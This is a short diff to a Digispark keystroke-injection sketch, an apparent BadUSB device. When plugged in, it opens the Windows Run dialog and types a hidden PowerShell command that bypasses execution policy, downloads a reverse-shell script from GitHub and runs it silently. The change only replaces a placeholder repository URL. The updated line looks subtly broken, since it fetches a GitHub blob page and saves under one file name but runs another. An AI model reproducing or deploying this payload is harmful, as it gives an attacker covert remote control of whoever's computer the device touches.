@@ -3,7 +3,7 @@
 void setup() {
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);  // Win + R
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/seu-usuario/seu-repositorio/main/reverse_shell.ps1' -OutFile $env:TEMP\\reverse_shell.ps1; Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File $env:TEMP\\reverse_shell.ps1' -WindowStyle Hidden\"");
+  DigiKeyboard.print("powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -Uri 'https://github.com/leightonisrael/digispark-play/blob/main/reverse-shell.ps1' -OutFile $env:TEMP\\reverse_shell.ps1; Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File $env:TEMP\\reverse-shell.ps1' -WindowStyle Hidden\"");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 }
 
